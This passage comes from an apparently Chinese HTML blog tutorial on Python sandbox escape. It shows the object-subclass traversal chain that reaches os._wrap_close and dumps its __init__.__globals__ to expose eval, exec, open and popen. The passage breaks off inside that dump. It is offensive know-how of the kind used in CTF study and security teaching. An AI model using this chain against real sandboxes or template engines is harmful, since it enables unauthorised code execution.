class="string">&#x27;typing._Final&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing._Immutable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing.Generic&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing._TypingEmpty&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing._TypingEllipsis&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing.Annotated&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing.NamedTuple&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing.TypedDict&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing.io&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing.re&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;importlib.abc.Finder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;importlib.abc.Loader&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;importlib.abc.ResourceReader&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;rlcompleter.Completer&#x27;</span>&gt;]</span><br></pre></td></tr></table></figure><p>找到需要使用的类，其中有可以使用的类</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;os._wrap_close&#x27;</span>&gt;,&lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.WarningMessage&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>调用他们</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">133</span>]  <span class="comment"># 是在上面列表中的第134个值,由于是数组所以填133</span></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;os._wrap_close&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">140</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>然后查看里面有什么可以利用的函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">133</span>].__init__.__globals__</span><br><span class="line">&#123;<span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>: <span class="string">&quot;OS routines for NT or Posix depending on what system we&#x27;re on.\n\nThis exports:\n  - all functions from posix or nt, e.g. unlink, stat, etc.\n  - os.path is either posixpath or ntpath\n  - os.name is either &#x27;posix&#x27; or &#x27;nt&#x27;\n  - os.curdir is a string representing the current directory (always &#x27;.&#x27;)\n  - os.pardir is a string representing the parent directory (always &#x27;..&#x27;)\n  - os.sep is the (or a most common) pathname separator (&#x27;/&#x27; or &#x27;\\\\&#x27;)\n  - os.extsep is the extension separator (always &#x27;.&#x27;)\n  - os.altsep is the alternate pathname separator (None or &#x27;/&#x27;)\n  - os.pathsep is the component separator used in $PATH etc\n  - os.linesep is the line separator in text files (&#x27;\\r&#x27; or &#x27;\\n&#x27; or &#x27;\\r\\n&#x27;)\n  - os.defpath is the default search path for executables\n  - os.devnull is the file path of the null device (&#x27;/dev/null&#x27;, etc.)\n\nPrograms that import and use &#x27;os&#x27; stand a better chance of being\nportable between different platforms.  Of course, they must then\nonly use functions that are defined by all platforms (e.g., unlink\nand opendir), and leave all pathname manipulation to os.path\n(e.g., split and join).\n&quot;</span>, <span class="string">&#x27;__package__&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>: &lt;_frozen_importlib_external.SourceFileLoader <span class="built_in">object</span> at <span class="number">0x7fc7ef53bbb0</span>&gt;, <span class="string">&#x27;__spec__&#x27;</span>: ModuleSpec(name=<span class="string">&#x27;os&#x27;</span>, loader=&lt;_frozen_importlib_external.SourceFileLoader <span class="built_in">object</span> at <span class="number">0x7fc7ef53bbb0</span>&gt;, origin=<span class="string">&#x27;/usr/lib/python3.9/os.py&#x27;</span>), <span class="string">&#x27;__file__&#x27;</span>: <span class="string">&#x27;/usr/lib/python3.9/os.py&#x27;</span>, <span class="string">&#x27;__cached__&#x27;</span>: <span class="string">&#x27;/usr/lib/python3.9/__pycache__/os.cpython-39.pyc&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>: &#123;<span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>: <span class="string">&quot;Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil&#x27; object; Ellipsis represents `...&#x27; in slices.&quot;</span>, <span class="string">&#x27;__package__&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;, <span class="string">&#x27;__spec__&#x27;</span>: ModuleSpec(name=<span class="string">&#x27;builtins&#x27;</span>, loader=&lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;, origin=<span class="string">&#x27;built-in&#x27;</span>), <span class="string">&#x27;__build_class__&#x27;</span>: &lt;built-<span class="keyword">in</span> function __build_class__&gt;, <span class="string">&#x27;__import__&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">__import__</span>&gt;, <span class="string">&#x27;abs&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">abs</span>&gt;, <span class="string">&#x27;all&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">all</span>&gt;, <span class="string">&#x27;any&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">any</span>&gt;, <span class="string">&#x27;ascii&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">ascii</span>&gt;, <span class="string">&#x27;bin&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">bin</span>&gt;, <span class="string">&#x27;breakpoint&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">breakpoint</span>&gt;, <span class="string">&#x27;callable&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">callable</span>&gt;, <span class="string">&#x27;chr&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">chr</span>&gt;, <span class="string">&#x27;compile&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">compile</span>&gt;, <span class="string">&#x27;delattr&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">delattr</span>&gt;, <span class="string">&#x27;dir&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">dir</span>&gt;, <span class="string">&#x27;divmod&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">divmod</span>&gt;, <span class="string">&#x27;eval&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;, <span class="string">&#x27;exec&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">exec</span>&gt;, <span class="string">&#x27;format&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">format</span>&gt;, <span class="string">&#x27;getattr&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">getattr</span>&gt;, <span class="string">&#x27;globals&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">globals</span>&gt;, <span class="string">&#x27;hasattr&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">hasattr</span>&gt;, <span class="string">&#x27;hash&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">hash</span>&gt;, <span class="string">&#x27;hex&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">hex</span>&gt;, <span class="string">&#x27;id&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">id</span>&gt;, <span class="string">&#x27;input&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">input</span>&gt;, <span class="string">&#x27;isinstance&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">isinstance</span>&gt;, <span class="string">&#x27;issubclass&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">issubclass</span>&gt;, <span class="string">&#x27;iter&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">iter</span>&gt;, <span class="string">&#x27;len&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">len</span>&gt;, <span class="string">&#x27;locals&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">locals</span>&gt;, <span class="string">&#x27;max&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">max</span>&gt;, <span class="string">&#x27;min&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">min</span>&gt;, <span class="string">&#x27;next&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">next</span>&gt;, <span class="string">&#x27;oct&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">oct</span>&gt;, <span class="string">&#x27;ord&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">ord</span>&gt;, <span class="string">&#x27;pow&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">pow</span>&gt;, <span class="string">&#x27;print&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">print</span>&gt;, <span class="string">&#x27;repr&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">repr</span>&gt;, <span class="string">&#x27;round&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">round</span>&gt;, <span class="string">&#x27;setattr&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">setattr</span>&gt;, <span class="string">&#x27;sorted&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">sorted</span>&gt;, <span class="string">&#x27;sum&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">sum</span>&gt;, <span class="string">&#x27;vars&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">vars</span>&gt;, <span class="string">&#x27;None&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;Ellipsis&#x27;</span>: <span class="literal">Ellipsis</span>, <span class="string">&#x27;NotImplemented&#x27;</span>: <span class="literal">NotImplemented</span>, <span class="string">&#x27;False&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;True&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;bool&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;bool&#x27;</span>&gt;, <span class="string">&#x27;memoryview&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;memoryview&#x27;</span>&gt;, <span class="string">&#x27;bytearray&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;, <span class="string">&#x27;bytes&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;bytes&#x27;</span>&gt;, <span class="string">&#x27;classmethod&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;classmethod&#x27;</span>&gt;, <span class="string">&#x27;complex&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;complex&#x27;</span>&gt;, <span class="string">&#x27;dict&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;, <span class="string">&#x27;enumerate&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;enumerate&#x27;</span>&gt;, <span class="string">&#x27;filter&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;filter&#x27;</span>&gt;, <span class="string">&#x27;float&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;float&#x27;</span>&gt;, <span class="string">&#x27;frozenset&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;frozenset&#x27;</span>&gt;, <span class="string">&#x27;property&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;property&#x27;</span>&gt;, <span class="string">&#x27;int&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt;, <span class="string">&#x27;list&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;, <span class="string">&#x27;map&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;map&#x27;</span>&gt;, <span class="string">&#x27;object&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;, <span class="string">&#x27;range&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;range&#x27;</span>&gt;, <span class="string">&#x27;reversed&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;reversed&#x27;</span>&gt;, <span class="string">&#x27;set&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;set&#x27;</span>&gt;, <span class="string">&#x27;slice&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;slice&#x27;</span>&gt;, <span class="string">&#x27;staticmethod&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;staticmethod&#x27;</span>&gt;, <span class="string">&#x27;str&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;, <span class="string">&#x27;super&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;super&#x27;</span>&gt;, <span class="string">&#x27;tuple&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;tuple&#x27;</span>&gt;, <span class="string">&#x27;type&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;, <span class="string">&#x27;zip&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;zip&#x27;</span>&gt;, <span class="string">&#x27;__debug__&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;BaseException&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;BaseException&#x27;</span>&gt;, <span class="string">&#x27;Exception&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;Exception&#x27;</span>&gt;, <span class="string">&#x27;TypeError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;TypeError&#x27;</span>&gt;, <span class="string">&#x27;StopAsyncIteration&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;StopAsyncIteration&#x27;</span>&gt;, <span class="string">&#x27;StopIteration&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;StopIteration&#x27;</span>&gt;, <span class="string">&#x27;GeneratorExit&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;GeneratorExit&#x27;</span>&gt;, <span class="string">&#x27;SystemExit&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;SystemExit&#x27;</span>&gt;, <span class="string">&#x27;KeyboardInterrupt&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;KeyboardInterrupt&#x27;</span>&gt;, <span class="string">&#x27;ImportError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ImportError&#x27;</span>&gt;, <span class="string">&#x27;ModuleNotFoundError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ModuleNotFoundError&#x27;</span>&gt;, <span class="string">&#x27;OSError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;OSError&#x27;</span>&gt;, <span class="string">&#x27;EnvironmentError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;OSError&#x27;</span>&gt;, <span class="string">&#x27;IOError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;OSError&#x27;</span>&gt;, <span class="string">&#x27;EOFError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;EOFError&#x27;</span>&gt;, <span class="string">&#x27;RuntimeError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;RuntimeError&#x27;</span>&gt;, <span class="string">&#x27;RecursionError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;RecursionError&#x27;</span>&gt;, <span class="string">&#x27;NotImplementedError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;NotImplementedError&#x27;</span>&gt;, <span class="string">&#x27;NameError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;NameError&#x27;</span>&gt;, <span class="string">&#x27;UnboundLocalError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;UnboundLocalError&#x27;</span>&gt;, <span class="string">&#x27;AttributeError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;AttributeError&#x27;</span>&gt;, <span class="string">&#x27;SyntaxError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;SyntaxError&#x27;</span>&gt;, <span class="string">&#x27;IndentationError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;IndentationError&#x27;</span>&gt;, <span class="string">&#x27;TabError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;TabError&#x27;</span>&gt;, <span class="string">&#x27;LookupError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;LookupError&#x27;</span>&gt;, <span class="string">&#x27;IndexError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;IndexError&#x27;</span>&gt;, <span class="string">&#x27;KeyError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;KeyError&#x27;</span>&gt;, <span class="string">&#x27;ValueError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ValueError&#x27;</span>&gt;, <span class="string">&#x27;UnicodeError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;UnicodeError&#x27;</span>&gt;, <span class="string">&#x27;UnicodeEncodeError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;UnicodeEncodeError&#x27;</span>&gt;, <span class="string">&#x27;UnicodeDecodeError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;UnicodeDecodeError&#x27;</span>&gt;, <span class="string">&#x27;UnicodeTranslateError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;UnicodeTranslateError&#x27;</span>&gt;, <span class="string">&#x27;AssertionError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;AssertionError&#x27;</span>&gt;, <span class="string">&#x27;ArithmeticError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ArithmeticError&#x27;</span>&gt;, <span class="string">&#x27;FloatingPointError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;FloatingPointError&#x27;</span>&gt;, <span class="string">&#x27;OverflowError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;OverflowError&#x27;</span>&gt;, <span class="string">&#x27;ZeroDivisionError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ZeroDivisionError&#x27;</span>&gt;, <span class="string">&#x27;SystemError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;SystemError&#x27;</span>&gt;, <span class="string">&#x27;ReferenceError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ReferenceError&#x27;</span>&gt;, <span class="string">&#x27;MemoryError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;MemoryError&#x27;</span>&gt;, <span class="string">&#x27;BufferError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;BufferError&#x27;</span>&gt;, <span class="string">&#x27;Warning&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;Warning&#x27;</span>&gt;, <span class="string">&#x27;UserWarning&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;UserWarning&#x27;</span>&gt;, <span class="string">&#x27;DeprecationWarning&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;DeprecationWarning&#x27;</span>&gt;, <span class="string">&#x27;PendingDeprecationWarning&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;PendingDeprecationWarning&#x27;</span>&gt;, <span class="string">&#x27;SyntaxWarning&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;SyntaxWarning&#x27;</span>&gt;, <span class="string">&#x27;RuntimeWarning&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;RuntimeWarning&#x27;</span>&gt;, <span class="string">&#x27;FutureWarning&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;FutureWarning&#x27;</span>&gt;, <span class="string">&#x27;ImportWarning&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ImportWarning&#x27;</span>&gt;, <span class="string">&#x27;UnicodeWarning&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;UnicodeWarning&#x27;</span>&gt;, <span class="string">&#x27;BytesWarning&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;BytesWarning&#x27;</span>&gt;, <span class="string">&#x27;ResourceWarning&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ResourceWarning&#x27;</span>&gt;, <span class="string">&#x27;ConnectionError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ConnectionError&#x27;</span>&gt;, <span class="string">&#x27;BlockingIOError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;BlockingIOError&#x27;</span>&gt;, <span class="string">&#x27;BrokenPipeError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;BrokenPipeError&#x27;</span>&gt;, <span class="string">&#x27;ChildProcessError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ChildProcessError&#x27;</span>&gt;, <span class="string">&#x27;ConnectionAbortedError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ConnectionAbortedError&#x27;</span>&gt;, <span class="string">&#x27;ConnectionRefusedError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ConnectionRefusedError&#x27;</span>&gt;, <span class="string">&#x27;ConnectionResetError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ConnectionResetError&#x27;</span>&gt;, <span class="string">&#x27;FileExistsError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;FileExistsError&#x27;</span>&gt;, <span class="string">&#x27;FileNotFoundError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;FileNotFoundError&#x27;</span>&gt;, <span class="string">&#x27;IsADirectoryError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;IsADirectoryError&#x27;</span>&gt;, <span class="string">&#x27;NotADirectoryError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;NotADirectoryError&#x27;</span>&gt;, <span class="string">&#x27;InterruptedError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;InterruptedError&#x27;</span>&gt;, <span class="string">&#x27;PermissionError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;PermissionError&#x27;</span>&gt;, <span class="string">&#x27;ProcessLookupError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ProcessLookupError&#x27;</span>&gt;, <span class="string">&#x27;TimeoutError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;TimeoutError&#x27;</span>&gt;, <span class="string">&#x27;open&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">open</span>&gt;, <span class="string">&#x27;quit&#x27;</span>: Use quit() <span class="keyword">or</span> Ctrl-D (i.e. EOF) to exit, <span class="string">&#x27;exit&#x27;</span>: Use exit() <span class="keyword">or</span> Ctrl-D (i.e. EOF) to exit, <span class="string">&#x27;copyright&#x27;</span>: Copyright (c) <span class="number">2001</span>-<span class="number">2022</span> Python Software Foundation.</span><br><span class="line">All Rights Reserved.</span><br><span class="line"></span><br><span class="line">Copyright (c) <span class="number">2000</span> BeOpen.com.</span><br><span class="line">All Rights Reserved.</span><br><span class="line"></span><br><span class="line">Copyright (c) <span class="number">1995</span>-<span class="number">2001</span> Corporation <span class="keyword">for</span> National Research Initiatives.</span><br><span class="line">All Rights Reserved.</span><br><span class="line"></span><br><span class="line">Copyright (c) <span class="number">1991</span>-<span class="number">1995</span> Stichting Mathematisch Centrum, Amsterdam.</span><br><span class="line">All Rights Reserved., <span class="string">&#x27;credits&#x27;</span>:     Thanks to CWI, CNRI, BeOpen.com, Zope Corporation <span class="keyword">and</span> a cast of thousands</span><br><span class="line">    <span class="keyword">for</span> supporting Python development.  See www.python.org <span class="keyword">for</span> more information., <span class="string">&#x27;license&#x27;</span>: <span class="type">Type</span> license() to see the full license text, <span class="string">&#x27;help&#x27;</span>: <span class="type">Type</span> <span class="built_in">help</span>() <span class="keyword">for</span> interactive <span class="built_in">help</span>, <span class="keyword">or</span> <span class="built_in">help</span>(<span class="built_in">object</span>) <span class="keyword">for</span> <span class="built_in">help</span> about <span class="built_in">object</span>., <span class="string">&#x27;_&#x27;</span>: <span class="literal">None</span>&#125;, <span class="string">&#x27;abc&#x27;</span>: &lt;module <span class="string">&#x27;abc&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python3.9/abc.py&#x27;</span>&gt;, <span class="string">&#x27;sys&#x27;</span>: &lt;module <span class="string">&#x27;sys&#x27;</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">&#x27;st&#x27;</span>: &lt;module <span class="string">&#x27;stat&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python3.9/stat.py&#x27;</span>&gt;, <span class="string">&#x27;_check_methods&#x27;</span>: &lt;function _check_methods at <span class="number">0x7fc7ef547a60</span>&gt;, <span class="string">&#x27;GenericAlias&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;types.GenericAlias&#x27;</span>&gt;, <span class="string">&#x27;__all__&#x27;</span>: [<span class="string">&#x27;altsep&#x27;</span>, <span class="string">&#x27;curdir&#x27;</span>, <span class="string">&#x27;pardir&#x27;</span>, <span class="string">&#x27;sep&#x27;</span>, <span class="string">&#x27;pathsep&#x27;</span>, <span class="string">&#x27;linesep&#x27;</span>, <span class="string">&#x27;defpath&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;devnull&#x27;</span>, <span class="string">&#x27;SEEK_SET&#x27;</span>, <span class="string">&#x27;SEEK_CUR&#x27;</span>, <span class="string">&#x27;SEEK_END&#x27;</span>, <span class="string">&#x27;fsencode&#x27;</span>, <span class="string">&#x27;fsdecode&#x27;</span>, <span class="string">&#x27;get_exec_path&#x27;</span>, <span class="string">&#x27;fdopen&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;extsep&#x27;</span>, <span class="string">&#x27;_exit&#x27;</span>, <span class="string">&#x27;CLD_CONTINUED&#x27;</span>, <span class="string">&#x27;CLD_DUMPED&#x27;</span>, <span class="string">&#x27;CLD_EXITED&#x27;</span>, <span class="string">&#x27;CLD_KILLED&#x27;</span>, <span class="string">&#x27;CLD_STOPPED&#x27;</span>, <span class="string">&#x27;CLD_TRAPPED&#x27;</span>, <span class="string">&#x27;DirEntry&#x27;</span>, <span class="string">&#x27;EX_CANTCREAT&#x27;</span>, <span class="string">&#x27;EX_CONFIG&#x27;</span>, <span class="string">&#x27;EX_DATAERR&#x27;</span>, <span class="string">&#x27;EX_IOERR&#x27;</span>, <span class="string">&#x27;EX_NOHOST&#x27;</span>, <span class="string">&#x27;EX_NOINPUT&#x27;</span>, <span class="string">&#x27;EX_NOPERM&#x27;</span>, <span class="string">&#x27;EX_NOUSER&#x27;</span>, <span class="string">&#x27;EX_OK&#x27;</span>, <span class="string">&#x27;EX_OSERR&#x27;</span>, <span class="string">&#x27;EX_OSFILE&#x27;</span>, <span class="string">&#x27;EX_PROTOCOL&#x27;</span>, <span class="string">&#x27;EX_SOFTWARE&#x27;</span>, <span class="string">&#x27;EX_TEMPFAIL&#x27;</span>, <span class="string">&#x27;EX_UNAVAILABLE&#x27;</span>, <span class="string">&#x27;EX_USAGE&#x27;</span>, <span class="string">&#x27;F_LOCK&#x27;</span>, <span class="string">&#x27;F_OK&#x27;</span>, <span class="string">&#x27;F_TEST&#x27;</span>, <span class="string">&#x27;F_TLOCK&#x27;</span>, <span class="string">&#x27;F_ULOCK&#x27;</span>, <span class="string">&#x27;GRND_NONBLOCK&#x27;</span>, <span class="string">&#x27;GRND_RANDOM&#x27;</span>, <span class="string">&#x27;MFD_ALLOW_SEALING&#x27;</span>, <span class="string">&#x27;MFD_CLOEXEC&#x27;</span>, <span class="string">&#x27;MFD_HUGETLB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_16GB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_16MB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_1GB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_1MB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_256MB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_2GB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_2MB&#x27;</span>, <span class="string">&#x27;MFD_HUGE_32MB&#x27;</span>, <span 